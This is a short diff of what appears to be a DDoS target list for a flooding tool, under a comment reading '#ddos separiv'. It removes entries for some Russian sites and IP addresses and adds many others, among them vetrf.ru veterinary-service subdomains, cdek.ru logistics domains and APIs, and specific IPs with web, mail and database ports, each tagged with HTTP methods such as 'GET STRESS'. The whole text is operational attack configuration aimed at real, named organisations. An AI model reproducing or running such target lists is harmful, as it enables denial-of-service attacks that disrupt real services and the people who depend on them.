@@ -10,6 +10,12 @@ https://auchan.ru tcp://46.243.184.43:443 tcp://46.243.184.47:443 --http-methods
 
 
 #ddos separiv
-http://robokazakh.ru https://finaxe.ru http://185.253.34.111:80 tcp://185.253.34.111:3306 --http-methods GET BYPASS
-https://185.253.34.111:443 http://185.253.34.111:1979 tcp://185.253.34.111:443 --http-methods GET BYPASS
-http://185.253.34.111:8192 http://185.253.34.111:8080 tcp://185.253.34.111:80 --http-methods GET BYPASS
+http://mercury.vetrf.ru https://ivis-sso.vetrf.ru http://assol-express.vetrf.ru --http-methods GET STRESS
+https://argus.vetrf.ru https://vetrf.ru --http-methods GET STRESS
+https://www.cdek.ru https://cdekid.cdek.ru https://tender-buy.cdek.ru/Tenders --http-methods GET STRESS
+https://cdek.kz/ru/ https://cdek.by/ru/ https://bonus.cdek.ru tcp://178.248.234.88:80 --http-methods GET STRESS
+https://api.cdek.ru https://global.cdek.ru https://mx12.cdek.ru tcp://195.189.222.58:465 --http-methods GET STRESS
+http://pokupkiusa.cdek.ru https://shopoglot.com/?ref=cdek https://pokupkiusa.track24.ru/ tcp://195.189.222.58:80 --http-methods GET STRESS
+http://login.izusa.cdek.ru https://fivepost.ru https://195.189.222.59:443 tcp://194.49.120.61:443 --http-methods GET STRESS
+https://194.49.120.61:443 http://195.189.222.42:80 tcp://195.189.222.62:25 --http-methods GET STRESS
+https://194.49.120.60:443 https://194.49.120.61:443 tcp://195.189.222.62:465 --http-methods GET STRESS
